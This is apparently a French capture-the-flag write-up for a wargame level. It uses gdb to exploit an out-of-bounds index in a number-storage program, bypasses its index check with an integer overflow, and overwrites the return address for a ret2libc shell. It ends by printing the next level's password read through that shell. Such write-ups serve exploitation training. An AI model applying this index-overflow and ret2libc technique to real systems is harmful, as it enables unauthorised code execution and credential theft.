# Level 07

Le programme permet de stocker des nombres dans des indices, un peu comme un annuaire.
On voit que l'on ne peux pas utiliser les indices resultant de [indice choisi] % 3 = 0
Mais il n'y a pas d'autre securite, donc nous pouvons entrer l'indice qu'on veut, et voir ce qu'il s'y trouve.

Dans un 1er temps nous allons dans gdb, mettre un bp au debut de la fonction read_number.

```
(gdb) b read_number
Breakpoint 1 at 0x80486dd
(gdb) run
Starting program: /home/users/level07/level07
----------------------------------------------------
  Welcome to wil's crappy number storage service!
----------------------------------------------------
 Commands:
    store - store a number into the data storage
    read  - read a number from the data storage
    quit  - exit the program
----------------------------------------------------
   wil has reserved some storage :>
----------------------------------------------------

Input command: store
 Number: 1111
 Index: 1
 Completed store command successfully
Input command: read

Breakpoint 1, 0x080486dd in read_number ()
(gdb) x/x $ebp+0x8 <=== emplacement de l'argument (voir code d'apres)
0xffffd2c0:     0xffffd2e4 <=== adresse du tableau data_array.
```

```
(gdb) disas read_number
Dump of assembler code for function read_number:
   0x080486d7 <+0>:     push   %ebp
   0x080486d8 <+1>:     mov    %esp,%ebp
   0x080486da <+3>:     sub    $0x28,%esp
   0x080486dd <+6>:     movl   $0x0,-0xc(%ebp)
   0x080486e4 <+13>:    mov    $0x8048add,%eax
   0x080486e9 <+18>:    mov    %eax,(%esp)
   0x080486ec <+21>:    call   0x8048470 <printf@plt>
   0x080486f1 <+26>:    call   0x80485e7 <get_unum>
   0x080486f6 <+31>:    mov    %eax,-0xc(%ebp)
   0x080486f9 <+34>:    mov    -0xc(%ebp),%eax
   0x080486fc <+37>:    shl    $0x2,%eax
   0x080486ff <+40>:    add    0x8(%ebp),%eax   <=== l'indice est pousse ici afin de recuperer la valeur dans data_array
   0x08048702 <+43>:    mov    (%eax),%edx
   0x08048704 <+45>:    mov    $0x8048b1b,%eax
   0x08048709 <+50>:    mov    %edx,0x8(%esp)
   0x0804870d <+54>:    mov    -0xc(%ebp),%edx
   0x08048710 <+57>:    mov    %edx,0x4(%esp)
   0x08048714 <+61>:    mov    %eax,(%esp)
   0x08048717 <+64>:    call   0x8048470 <printf@plt>
   0x0804871c <+69>:    mov    $0x0,%eax
   0x08048721 <+74>:    leave
   0x08048722 <+75>:    ret
```

Nous allons tenter de trouver l'offset qui permettrait d'ecraser EIP.

On met un nouveau bp avant l'appel de read_number.

```
(gdb) disas main
Dump of assembler code for function main:
0x0804892b <+520>:   call   0x80486d7 <read_number>
(gdb) b *0x0804892b
Breakpoint 2 at 0x804892b
(gdb) r
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/users/level07/level07

Input command: read

Breakpoint 2, 0x0804892b in main ()
(gdb) i f
Stack level 0, frame at 0xffffd4b0:
 eip = 0x804892b in main; saved eip 0xf7e45513
 Arglist at 0xffffd4a8, args:
 Locals at 0xffffd4a8, Previous frame's sp is 0xffffd4b0
 Saved registers:
  ebx at 0xffffd49c, ebp at 0xffffd4a8, esi at 0xffffd4a0, edi at 0xffffd4a4, eip at 0xffffd4ac <=== stockage de l'adresse de retour dans eip sur la stack frame.
```

Nous allons faire le calcul suivant pour trouver l'offset de la fonction : 4294956204 (0xffffd4ac) - 4294955748 (0xffffd2e4) = 456 / 4 (4 bits par adresse) = 114.

A l'indice 114 nous devrions retouve l'adresse du return.

```
(gdb) c
Continuing.
 Index: 114
 Number at data[114] is 4158936339
 Completed read command successfully
```

4158936339 = 0xf7e45513 en hexa

```
(gdb) b *0x080489f1   <=== derniere instruction du programme, ret.
Breakpoint 4 at 0x80489f1
(gdb) r
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/users/level07/level07

Input command: quit
Breakpoint 4, 0x080489f1 in main ()
(gdb) x/x $esp
0xffffd4ac:     0xf7e45513  <=== adresse a override, et on sait qu'elle est a l'indice 114.
```

Nous pouvons override l'adresse a l'indice 114, cependant, impossible car condition %3 vraie.
Pour contourner cette limitation, nous allons depasser le uint max avec le calcul suivant :  4294967296 / 4 + 114  = 1073741938

Il nous reste plus qu'a trouver les adresse de bin/sh et system pour faire un ret2libc.

```
(gdb) b main
Breakpoint 1 at 0x8048729
Starting program: /home/users/level07/level07
Breakpoint 1, 0x08048729 in main ()
(gdb) p system
$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
(gdb) find 0x00000000, 0xffffffff, "/bin/sh"
warning: Unable to access target memory at 0x0, halting search.
Pattern not found.
(gdb) find &system, +9999999, "/bin/sh"
0xf7f897ec
```
4159090384
4160264172

FINAL
```
level07@OverRide:~$ ./level07
----------------------------------------------------
  Welcome to wil's crappy number storage service!
----------------------------------------------------
 Commands:
    store - store a number into the data storage
    read  - read a number from the data storage
    quit  - exit the program
----------------------------------------------------
   wil has reserved some storage :>
----------------------------------------------------

Input command: store
 Number: 4159090384  <=== system
 Index: 1073741938
 Completed store command successfully
Input command: store
 Number: 4160264172 <==== /bin/sh
 Index: 116
 Completed store command successfully
Input command: quit
$ cat /home/users/level08/.pass
7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
```